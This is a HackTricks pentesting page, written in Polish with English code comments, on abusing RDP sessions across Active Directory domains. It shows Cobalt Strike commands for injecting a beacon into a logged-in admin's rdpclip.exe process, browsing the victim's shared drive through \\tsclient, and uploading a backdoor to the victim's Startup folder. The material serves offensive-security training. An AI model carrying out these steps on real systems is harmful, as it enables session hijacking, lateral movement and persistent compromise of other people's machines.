# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Jeśli **grupa zewnętrzna** ma **dostęp RDP** do jakiegokolwiek **komputera** w bieżącej domenie, **atakujący** może **skompromentować ten komputer i czekać na niego**.

Gdy ten użytkownik uzyska dostęp przez RDP, **atakujący może przejąć sesję tego użytkownika** i nadużyć jego uprawnień w zewnętrznej domenie.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Sprawdź **inne sposoby kradzieży sesji za pomocą innych narzędzi** [**na tej stronie.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Jeśli użytkownik uzyskuje dostęp przez **RDP do maszyny**, gdzie **atakujący** czeka na niego, atakujący będzie mógł **wstrzyknąć beacon w sesję RDP użytkownika**, a jeśli **ofiara zamontowała swój dysk** podczas uzyskiwania dostępu przez RDP, **atakujący mógłby uzyskać do niego dostęp**.

W tym przypadku możesz po prostu **skompromentować** **oryginalny komputer ofiary**, pisząc **tylną furtkę** w **folderze uruchamiania**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
{{#include ../../banners/hacktricks-training.md}}
